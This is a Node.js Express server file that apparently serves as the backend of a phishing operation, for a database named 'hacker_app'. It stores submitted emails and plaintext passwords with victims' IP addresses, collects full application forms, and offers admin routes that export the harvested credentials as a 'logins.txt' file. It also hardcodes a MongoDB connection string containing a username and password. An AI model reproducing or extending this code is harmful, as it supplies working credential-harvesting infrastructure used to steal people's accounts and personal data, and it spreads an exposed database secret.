// backend/server.js
require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// simple request logger for debugging (prints method, path, body)
app.use((req, res, next) => {
  console.log(`[REQ] ${new Date().toISOString()} ${req.method} ${req.path} body=${JSON.stringify(req.body)}`);
  next();
});

// Serve static files (optional)
app.use(express.static(path.join(__dirname, '../')));

// ---------- MongoDB connection (explicit hacker_app DB) ----------
const MONGO_URI = process.env.MONGO_URI ||
  "mongodb+srv://samsmollett:adikah1234@cluster0.s8ofap9.mongodb.net/hacker_app?retryWrites=true&w=majority";

mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("✅ Connected to MongoDB Atlas (hacker_app)"))
  .catch((err) => console.error("❌ MongoDB connection error:", err));

// ---------- Schemas / models ----------
const loginSchema = new mongoose.Schema({
  email: String,
  password: String,
  createdAt: { type: Date, default: Date.now },
  ip: String
});
const applicationSchema = new mongoose.Schema({
  form: Object,
  createdAt: { type: Date, default: Date.now },
  ip: String
});

const Login = mongoose.model('Login', loginSchema);
const Application = mongoose.model('Application', applicationSchema);

// helper to pick client ip (works behind proxies)
function getClientIp(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

// ---------- Routes ----------

// Save login info
app.post('/save-login', async (req, res) => {
  const { email, password } = req.body;
  console.log(`[SAVE-LOGIN] received: email=${email ? email : '[no-email]'} passwordPresent=${!!password}`);
  if (!email || !password) {
    console.log('[SAVE-LOGIN] missing fields');
    return res.status(400).send({ error: 'Missing email or password' });
  }

  try {
    const ip = getClientIp(req);
    const doc = await Login.create({ email, password, ip });
    console.log(`[LOGIN SAVED] ${new Date().toISOString()} id=${doc._id} email=${doc.email} ip=${ip}`);
    return res.send({ status: 'ok', id: doc._id });
  } catch (err) {
    console.error("❌ Error saving login:", err);
    return res.status(500).send({ error: 'Database error' });
  }
});

// Save application form
app.post('/save-application', async (req, res) => {
  try {
    console.log('[SAVE-APPLICATION] body:', JSON.stringify(req.body));
    const ip = getClientIp(req);
    const doc = await Application.create({ form: req.body, ip });
    console.log(`[APPLICATION SAVED] ${new Date().toISOString()} id=${doc._id} ip=${ip}`);
    return res.send({ status: 'ok', id: doc._id });
  } catch (err) {
    console.error("❌ Error saving application:", err);
    return res.status(500).send({ error: 'Database error' });
  }
});

// Admin JSON views (protected by token)
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'admin-token-placeholder';

app.get('/logins', async (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
  const docs = await Login.find().sort({ createdAt: -1 }).limit(500).lean();
  return res.json(docs);
});

app.get('/applications', async (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
  const docs = await Application.find().sort({ createdAt: -1 }).limit(500).lean();
  return res.json(docs);
});

// Admin download (protected)
app.get('/admin/download-login-file', async (req, res) => {
  const token = req.headers['x-admin-token'] || req.query.token;
  if (!ADMIN_TOKEN || token !== ADMIN_TOKEN) return res.status(401).send('Unauthorized');
  const logins = await Login.find().sort({ createdAt: -1 }).lean();
  const content = logins.map(l => `Email: ${l.email}, Password: ${l.password}, createdAt:${l.createdAt}`).join('\n');
  res.setHeader('Content-Disposition', 'attachment; filename=logins.txt');
  res.setHeader('Content-Type', 'text/plain');
  res.send(content);
});

// Debug route to print current DB entries in logs
app.get('/debug', async (req, res) => {
  try {
    const logins = await Login.find().sort({ createdAt: -1 }).limit(200).lean();
    const applications = await Application.find().sort({ createdAt: -1 }).limit(200).lean();
    console.log('---- LOGINS ----');
    console.log(JSON.stringify(logins, null, 2));
    console.log('---- APPLICATIONS ----');
    console.log(JSON.stringify(applications, null, 2));
    return res.send({ status: 'ok', message: 'Check server logs for MongoDB data' });
  } catch (err) {
    console.error('❌ Error fetching data:', err);
    return res.status(500).send({ error: 'Database error' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));






